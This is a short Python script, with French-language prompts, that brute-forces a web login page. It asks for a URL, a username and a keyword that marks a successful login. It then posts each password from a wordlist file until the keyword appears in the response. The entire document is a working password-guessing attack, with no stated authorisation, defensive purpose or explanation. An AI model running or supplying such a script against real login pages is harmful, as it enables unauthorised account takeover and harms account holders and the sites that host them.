import requests

url = input("URL de la page de login : ")
username = input("Nom d'utilisateur à tester : ")
password_file = "wordlist.txt"
success_keyword = input("Mot-clé présent si la connexion réussit (ex: tableau de bord) : ")

with open(password_file, "r") as f:
    for password in f:
        password = password.strip()
        print(f"[*] Tentative avec : {password}")
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if success_keyword in response.text:
            print(f"[+] Mot de passe trouvé : {password}")
            break
    else:
        print("[-] Mot de passe non trouvé dans la wordlist.")
